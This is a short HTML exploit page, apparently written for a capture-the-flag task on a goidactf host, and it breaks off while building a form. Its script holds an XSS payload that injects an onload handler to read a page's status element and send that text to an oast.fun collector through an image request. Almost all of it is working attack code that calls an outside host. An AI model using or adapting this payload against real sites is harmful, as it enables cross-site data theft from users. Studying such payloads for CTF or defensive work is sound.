<!DOCTYPE html>
<html>
<body>
<script>
const TARGET = "https://tasks.goidactf.ru:20385";
const OAST = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";

// XSS payload для чтения статуса
const xssPayload = 'admin" onload="var s=document.getElementById(\\\'status\\\').textContent;' +
                   'new Image().src=\\'${OAST}/leak?xss=\\'+encodeURIComponent(s);">';

const form = document.createElement('form');
